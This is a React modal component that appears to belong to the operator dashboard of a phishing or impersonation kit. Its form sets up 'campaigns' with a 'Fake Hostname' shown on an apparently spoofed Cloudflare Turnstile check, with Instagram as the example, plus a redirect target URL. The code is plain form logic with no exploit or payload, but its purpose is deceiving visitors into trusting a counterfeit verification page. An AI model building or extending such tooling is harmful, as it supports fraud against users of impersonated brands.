"use client";

import { useState, useEffect, useRef } from "react";

interface CreateCampaignModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (data: { name: string; hostname: string; redirect: string }) => Promise<void>;
  editData?: { name: string; hostname: string; redirect: string } | null;
  onSubmitEdit?: (data: { name: string; hostname: string; redirect: string }) => Promise<void>;
}

export default function CampaignModal({
  isOpen,
  onClose,
  onSubmit,
  editData,
  onSubmitEdit,
}: CreateCampaignModalProps) {
  const [name, setName] = useState("");
  const [hostname, setHostname] = useState("");
  const [redirect, setRedirect] = useState("");
  const nameRef = useRef<HTMLInputElement>(null);

  const [error, setError] = useState("");

  const isEditing = !!editData;

  useEffect(() => {
    if (isOpen) {
      setError("");
      if (editData) {
        setName(editData.name);
        setHostname(editData.hostname);
        setRedirect(editData.redirect);
      } else {
        setName("");
        setHostname("");
        setRedirect("");
      }
      setTimeout(() => nameRef.current?.focus(), 100);
    }
  }, [isOpen, editData]);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const data = {
      name: name.trim(),
      hostname: hostname.trim(),
      redirect: redirect.trim(),
    };
    try {
      if (isEditing && onSubmitEdit) {
        await onSubmitEdit(data);
      } else {
        await onSubmit(data);
      }
      onClose();
    } catch (err) {
      console.error("Campaign save failed:", err);
      setError(err instanceof Error ? err.message : "Failed to save campaign");
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="dashboard-card modal-card" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <h2 className="modal-title">{isEditing ? "✏️ Edit Campaign" : "➕ Create Session"}</h2>
          <button className="close-modal-x" onClick={onClose}>
            ✕
          </button>
        </div>
        <form onSubmit={handleSubmit}>
          {error && (
            <div
              style={{
                marginBottom: "16px",
                padding: "12px",
                borderRadius: "8px",
                background: "rgba(248, 113, 113, 0.08)",
                border: "1px solid rgba(248, 113, 113, 0.2)",
                color: "#f87171",
                fontSize: "13px",
              }}
            >
              {error}
            </div>
          )}
          <div className="form-group">
            <label htmlFor="campaignName">Session Name</label>
            <input
              ref={nameRef}
              type="text"
              id="campaignName"
              className="form-control"
              placeholder="e.g., Instagram Campaign"
              value={name}
              onChange={(e) => setName(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="campaignHostname">Fake Hostname (Turnstile Display)</label>
            <input
              type="text"
              id="campaignHostname"
              className="form-control"
              placeholder="e.g., instagram.com"
              value={hostname}
              onChange={(e) => setHostname(e.target.value)}
              required
            />
          </div>
          <div className="form-group">
            <label htmlFor="campaignRedirect">Redirect Target URL</label>
            <input
              type="text"
              id="campaignRedirect"
              className="form-control"
              placeholder="e.g., https://instagram.com"
              value={redirect}
              onChange={(e) => setRedirect(e.target.value)}
              required
            />
          </div>
          <div className="modal-actions">
            <button type="button" className="btn btn-secondary" onClick={onClose}>
              Cancel
            </button>
            <button type="submit" className="btn btn-primary">
              {isEditing ? "Save Changes" : "Create Campaign"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
